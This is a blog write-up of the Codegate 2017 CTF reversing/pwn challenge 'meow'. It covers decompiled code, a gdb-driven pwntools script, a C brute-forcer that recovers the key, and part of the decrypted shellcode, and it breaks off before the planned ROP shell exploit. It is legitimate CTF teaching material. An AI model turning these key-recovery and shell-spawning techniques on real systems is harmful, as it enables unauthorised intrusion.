<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Codegate prequals 2017: meow (pwn 365) | Isaac's Blog</title><link rel="canonical" href="https://poning.me/2017/02/20/meow/"/><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>Codegate prequals 2017: meow (pwn 365)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2017-02-20</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/Codegate-prequals/">Codegate prequals</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a>/<a class="post-tag-link" href="/tags/reverse/">reverse</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Meow~Meow~<br><a href="/2017/02/20/meow/meow" title="http://ctf.codegate.org/z/meow">http://ctf.codegate.org/z/meow</a><br>nc 110.10.212.139 50410</p>
</blockquote>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Observe how user’s input is used to “decrypt” the hard coded data</li>
<li>Guess that the “decrypted” data should start with <code>push rbp; mov rbp, rsp;</code> and end with <code>leave; ret;</code></li>
<li>Brute force md5 with the constraints found above</li>
<li>Use the ROP gadgets that author deliberately provide to launch a shell</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br></pre></td><td class="code"><pre>*(<span class="hljs-number">_</span>QWORD *)s2 = <span class="hljs-number">0x618F652224A9469F</span>LL;<br>*(<span class="hljs-number">_</span>QWORD *)&amp;s2[<span class="hljs-number">8</span>] = <span class="hljs-number">1493362804178947496L</span>L;<br>MD5_Init(&amp;v2);<br>MD5_Update(&amp;v2, input, <span class="hljs-number">10L</span>L);<br>MD5_Final(&amp;s1, &amp;v2);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(&amp;s1, s2, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">0</span>;<br></pre></td></tr></table></figure>
<p>At the very beginning of the binary, it asks us to input a 10 bytes string of which md5 is equal to <code>9f46a92422658f61a80ddee78e7db914</code>… I tried searching this md5 on some online database but got no answer. Since it is also impossible to brute force an 80 bits input, I was totally stuck at this stage.</p>
<img src="/2017/02/20/meow/no_way.gif" alt="no_way.gif" title="">
<p>When I was going to give up, one of my teammates reminded me that the input is also being used in the latter part of the program. Maybe we could find other constraints to reduce the search space of the input. It turned out to be the right direction, so let’s see what the remaining program does.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br></pre></td><td class="code"><pre>sub_D1D((<span class="hljs-number">__</span>int64)&amp;v12, (<span class="hljs-number">__</span>int64)&amp;input, v15);<br>sub_D1D((<span class="hljs-number">__</span>int64)&amp;v5, (<span class="hljs-number">__</span>int64)&amp;input, v14);<br>sub_1467((<span class="hljs-keyword">void</span> **)&amp;qword_2020B8, v17, v15, &amp;v12);<br>sub_1467((<span class="hljs-keyword">void</span> **)&amp;unk_2020C0, v16, v14, &amp;v5);<br>sub_C45();<br></pre></td></tr></table></figure>
<p>Roughly speaking, there are two segments of data. They are both operated with some sort of “decryption” in <code>sub_D1D</code> with our input as the key and then copied to a mmaped memory with the execute permission in <code>sub_1467</code>. Finally, in <code>sub_C45</code>, we can choose option 3 to jump to the first segment of the decrypted data and execute them as instructions.</p>
<p>Now, we know that at least the first segment of data should be decrypted to legal x86 instructions. Let’s see what <code>sub_D1D</code> actually does.</p>
<figure class="highlight c"><figcaption><span>sub_D1D</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br></pre></td><td class="code"><pre>v14 = <span class="hljs-number">0</span>;<br>j = <span class="hljs-number">0</span>;<br>v19 = <span class="hljs-number">4</span>;<br>v18 = <span class="hljs-number">5</span>;<br>v17 = <span class="hljs-number">3</span>;<br>v13 = <span class="hljs-number">10</span>;<br>v12 = <span class="hljs-number">5</span>;<br>v11 = <span class="hljs-number">7</span>;<br>v16 = <span class="hljs-number">0</span>;<br>v15 = a3;<br>v9 = <span class="hljs-number">0L</span>L;<br>v10 = <span class="hljs-number">0</span>;<br>v7 = <span class="hljs-number">0</span>;<br>v8 = <span class="hljs-number">0</span>;<br>v4 = <span class="hljs-number">0</span>;<br>v5 = <span class="hljs-number">0</span>;<br>v6 = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a3 - a3 % v11 &gt; i; i += v11 )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v17; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v4 + j) = *(<span class="hljs-number">_B</span>YTE *)(j + v16 + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v11 - v17 &gt; j; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v4 + j + v17) = *(<span class="hljs-number">_B</span>YTE *)(v17 + v15 - v11 + j + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v11; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v4 + j) ^= *(<span class="hljs-number">_B</span>YTE *)(j + user_input);  <span class="hljs-comment">// user input</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v17; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + j + v16) = *((<span class="hljs-number">_B</span>YTE *)&amp;v4 + j + v11 - v17);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v11 - v17 &gt; j; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + v17 + v15 - v11 + j) = *((<span class="hljs-number">_B</span>YTE *)&amp;v4 + j);<br>  v16 += v17;<br>  v15 -= v11 - v17;<br>  v17 += <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">if</span> ( v17 == <span class="hljs-number">9</span> )<br>    v17 = <span class="hljs-number">3</span>;<br>&#125;<br>v16 = <span class="hljs-number">0</span>;<br>v15 = a3;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a3 - a3 % v12 &gt; i; i += v12 )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v18; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v7 + j) = *(<span class="hljs-number">_B</span>YTE *)(j + v16 + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v12 - v18 &gt; j; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v7 + j + v18) = *(<span class="hljs-number">_B</span>YTE *)(v18 + v15 - v12 + j + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v12; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v7 + j) ^= *(<span class="hljs-number">_B</span>YTE *)(<span class="hljs-number">2</span> * j + <span class="hljs-number">1L</span>L + user_input);  <span class="hljs-comment">// user input</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v18; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + j + v16) = *((<span class="hljs-number">_B</span>YTE *)&amp;v7 + j + v12 - v18);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v12 - v18 &gt; j; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + v18 + v15 - v12 + j) = *((<span class="hljs-number">_B</span>YTE *)&amp;v7 + j);<br>  v16 += v18;<br>  v15 -= v12 - v18--;<br>  <span class="hljs-keyword">if</span> ( !v18 )<br>    v18 = <span class="hljs-number">5</span>;<br>&#125;<br>v16 = <span class="hljs-number">0</span>;<br>v15 = a3;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a3 - a3 % v13 &gt; i; i += v13 )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v19; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j) = *(<span class="hljs-number">_B</span>YTE *)(j + v16 + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v13 - v19 &gt; j; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j + v19) = *(<span class="hljs-number">_B</span>YTE *)(v19 + v15 - v13 + j + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v13; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j) ^= *(<span class="hljs-number">_B</span>YTE *)(j + user_input);  <span class="hljs-comment">// user input</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v19; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + j + v16) = *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j + v13 - v19);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v13 - v19 &gt; j; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + v19 + v15 - v13 + j) = *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j);<br>  v16 += v19;<br>  v15 -= v13 - v19++;<br>  <span class="hljs-keyword">if</span> ( v19 == <span class="hljs-number">9</span> )<br>    v19 = <span class="hljs-number">4</span>;<br>&#125;<br>v16 = <span class="hljs-number">0</span>;<br>v15 = a3;<br>v19 = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a3 - a3 % v13 &gt; i; i += v13 )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v19; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j) = *(<span class="hljs-number">_B</span>YTE *)(j + v16 + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v13 - v19 &gt; j; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j + v19) = *(<span class="hljs-number">_B</span>YTE *)(v19 + v15 - v13 + j + initial_content);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v13; ++j )<br>    *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j) ^= *(<span class="hljs-number">_B</span>YTE *)(j + user_input);  <span class="hljs-comment">// user input</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v19; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + j + v16) = *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j + v13 - v19);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v13 - v19 &gt; j; ++j )<br>    *(<span class="hljs-number">_B</span>YTE *)(initial_content + v19 + v15 - v13 + j) = *((<span class="hljs-number">_B</span>YTE *)&amp;v9 + j);<br>  v16 += v19;<br>  v15 -= v13 - v19++;<br>  <span class="hljs-keyword">if</span> ( v19 == <span class="hljs-number">9</span> )<br>    v19 = <span class="hljs-number">4</span>;<br>&#125;<br></pre></td></tr></table></figure>
<p>The decompiled code is quite complicated, but we can see that the user’s input is only involved in some xor operations. Maybe we can find out what this code snippet does by observing the input and the output of it. To do this, I first patched the md5 checking and input <code>&#39;\x00&#39;*10</code> to see what is the effect without user’s input through <code>gdb</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>input:<br>f1 64 72 4a 4f 48 4d ba 77 73 1d 34 f5 af b8 0f<br>24 56 11 65 47 a3 2f 73 a4 56 4f 70 4a 13 57 9c<br>3f 6f 06 61 40 90 af 39 10 29 34 c3 00 7a 40 3d<br>4e 3f 0e 2a 2f 20 7f 73 89 7d 4b 1d 09 aa d0 00<br>21 89 4d 2a 67 7c 18 3b 39 f2 8d 1c a7 71 57 2e<br>31 14 67 48 3c 7d af 70 ae 10 31 68 d1 26 05 c8<br>25 f2 62 f5 5d 38 34 f2 20 0e 7e 9f fb 57 72 26<br>57 67 15 10 15 13 b9 3e 79 89 5d 24 12 01 98 7b<br>18 25 e0 df 7c 24 1b 2d 44 b0 10 3d 57 3d 62 b4<br>21 1d 3e d1 10 d7 45 74 96 2b 6d 3b ed 10 00 67<br>31 df 6c b8 86 1a 7c 6b 64 78 c6 37 76 e6 61 a0<br>ad be 4c ba a7 0d<br><br>output:<br>0d 48 f5 af 4d ad be 77 4c a4 56 34 64 72 4f 37<br>31 6f 70 e6 61 a0 11 9c 3f 06 13 3d 73 65 78 61<br>34 c3 40 86 1a af 40 7f 73 29 3f 7a 6d 67 68 d1<br>7d df 6c b8 71 2e 1c 62 1d 31 20 10 10 89 39 f2<br>4d 96 2b 67 05 3c 7d 3b 44 26 7e d1 01 98 70 d7<br>45 74 79 25 24 7b 10 24 48 89 1d c8 34 f2 25 57<br>3d 62 7c 26 57 38 3e df 13 b0 10 b9 10 3d 72 1b<br>20 2d 67 15 15 f5 5d f2 b4 21 af 12 31 14 3e 9f<br>57 ae 18 67 8d 5d e0 fb 0e 7c 18 2a 3b ed 89 a7<br>0e 2a 00 4e aa 4b 57 2f 00 00 21 09 d0 39 10 90<br>6b 64 4f 7c 47 a3 c6 f1 76 4a 57 2f b8 0f 24 56<br>4a 73 1d ba ba a7<br></pre></td></tr></table></figure>
<p>If we observe the input and the output carefully, we would find that the code is only shuffling the input. Then, it is time to exam the effect of the user’s input. Using the same procedure, we can easily find that every byte of user’s input is xor with some fixed bytes of data, so I wrote a script to visualize this operation.</p>
<figure class="highlight python"><figcaption><span>find_pattern.py</span><a href="/2017/02/20/meow/find_pattern.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> termcolor <span class="hljs-keyword">import</span> colored<br><span class="hljs-keyword">import</span> re<br><br>context.log_level = <span class="hljs-string">'error'</span><br><br>gdb_prompt = <span class="hljs-string">'\x01\x1b[1m\x1b[31m\x02pwndbg&gt; \x01\x1b[0m\x1b[1m\x1b[0m\x02'</span><br>decrypted = []<br><br><span class="hljs-comment"># Launch the process and gdb. Then, dump the data after decryption.</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">11</span>):<br>    gdb = process([<span class="hljs-string">'gdb'</span>, <span class="hljs-string">'-q'</span>])<br>    gdb.recvuntil(gdb_prompt, drop=<span class="hljs-keyword">True</span>)<br><br>    meow = process(<span class="hljs-string">'meow'</span>)<br>    gdb.sendline(<span class="hljs-string">'attach '</span> + str(meow.proc.pid))<br>    gdb.recvuntil(gdb_prompt, drop=<span class="hljs-keyword">True</span>)<br><br>    gdb.sendline(<span class="hljs-string">'b *0x55555555568b'</span>)<br>    gdb.recvuntil(gdb_prompt, drop=<span class="hljs-keyword">True</span>)<br><br>    key = bytearray(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">0</span>:<br>        key[i<span class="hljs-number">-1</span>] = <span class="hljs-string">'\x01'</span><br>    meow.sendline(key)<br><br>    gdb.sendline(<span class="hljs-string">'continue'</span>)<br>    gdb.recvuntil(gdb_prompt, drop=<span class="hljs-keyword">True</span>)<br><br>    gdb.sendline(<span class="hljs-string">'db $rdi 182'</span>)<br>    decrypted.append(re.findall(<span class="hljs-string">r'\b\S\S\b'</span>, gdb.recvuntil(gdb_prompt, drop=<span class="hljs-keyword">True</span>)))<br><br>    gdb.close()<br>    meow.close()<br><br><span class="hljs-comment"># Compare the original data with data decrypted by differnt keys.</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">'    0  1  2  3  4  5  6  7  8  9'</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(decrypted[<span class="hljs-number">0</span>])):<br>    <span class="hljs-keyword">print</span> decrypted[<span class="hljs-number">0</span>][i],<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>        <span class="hljs-keyword">if</span> decrypted[<span class="hljs-number">0</span>][i] != decrypted[j][i]:<br>            <span class="hljs-keyword">print</span> colored(decrypted[j][i], <span class="hljs-string">'red'</span>),<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">print</span> decrypted[j][i],<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">''</span><br></pre></td></tr></table></figure>
<p>The output would looks like (only portion):</p>
<img src="/2017/02/20/meow/pattern.png" alt="pattern.png" title="">
<p>Data affected by the nth byte of user’s input are highlighted. Now, we know how the “decryption” works. If we also know what the decrypted code should be, we can derive the input inversely. Unfortunately, we have no clue about the decrypted code. However, it is reasonable to guess that the prologue and epilogue should be the standard <code>push rbp; mov rbp, rsp;</code> and <code>leave; ret;</code>. With only these bytes of information, we can establish several relations between bytes of user’s input and shrink the search space of md5 to a small range. (By the way, these relations suggest that the MSB of the xor of any two bytes of user’s input is <code>0</code>, so I boldly guess that the input is printable.)</p>
<p>I wrote a C code to brute force the correct user’s input, which is <code>$W337k!++y</code>.</p>
<figure class="highlight c"><figcaption><span>bruteforce.c</span><a href="/2017/02/20/meow/bruteforce.c">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br></pre></td><td class="code"><pre><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/md5.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* TARGET = <span class="hljs-string">"\x9f\x46\xa9\x24\x22\x65\x8f\x61\xa8\x0d\xde\xe7\x8e\x7d\xb9\x14"</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> result[MD5_DIGEST_LENGTH];<br><br>  <span class="hljs-keyword">char</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">11</span>] = {<span class="hljs-number">0</span>};<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> i = <span class="hljs-number">0x20</span>; i &lt;= <span class="hljs-number">0x7e</span>; i++) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"input[2] = 0x%02x\n"</span>, i);<br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> j = <span class="hljs-number">0x20</span>; j &lt;= <span class="hljs-number">0x7e</span>; j++) {<br>          <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> k = <span class="hljs-number">0x20</span>; k &lt;= <span class="hljs-number">0x7e</span>; k++) {<br>              <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> l = <span class="hljs-number">0x20</span>; l &lt;= <span class="hljs-number">0x7e</span>; l++) {<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">2</span>] = i;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">5</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0b01011000</span>;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">3</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">2</span>];<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">9</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0b01001010</span>;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0b01100100</span>;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">8</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0b01111100</span>;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">0</span>] = <span class="hljs-built_in">string</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0b01110011</span>;<br><br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">4</span>] = j;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">6</span>] = k;<br>                  <span class="hljs-built_in">string</span>[<span class="hljs-number">7</span>] = l;<br><br>                  MD5(<span class="hljs-built_in">string</span>, <span class="hljs-number">10</span>, result);<br>                  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strncmp</span>(result, TARGET, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {<br>                      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, <span class="hljs-built_in">string</span>);<br>                  }<br>              }<br>          }<br>      }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></pre></td></tr></table></figure>
<p>After providing the correct input, the challenge is still not finished.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>***** hello? *****<br>&gt;&gt;&gt; $W337k!++y<br>- What kind of pet would you like to have?<br>- Select the number of pet!<br>1. angelfish<br>2. bear<br>3. cat<br>4. dog<br>5. I don&apos;t want pets<br># number = 3<br>Did you choose a cat?????<br>What type of cat would you prefer? &apos;0&apos;<br>&gt;&gt;&gt;<br></pre></td></tr></table></figure>
<p>The decrypted code is:</p>
<figure class="highlight x86asm"><figcaption><span>First part of decrypted code</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br></pre></td><td class="code"><pre><span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x60</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x20756f7920646944</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x60</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x612065736f6f6863</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x58</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x3f3f3f3f74616320</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x50</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x7420746168570a3f</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x48</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x6320666f20657079</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x646c756f77207461</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x38</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x65727020756f7920</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x30</span>],<span class="hljs-built_in">rax</span><br>movabs <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x273027203f726566</span><br><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>],<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>],<span class="hljs-number">0x3e3e3e0a</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x1c</span>],<span class="hljs-number">0x0</span><br><span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x60</span>]<br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x44</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x1</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x8</span>]<br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x18</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x0</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword">leave</span><br><span 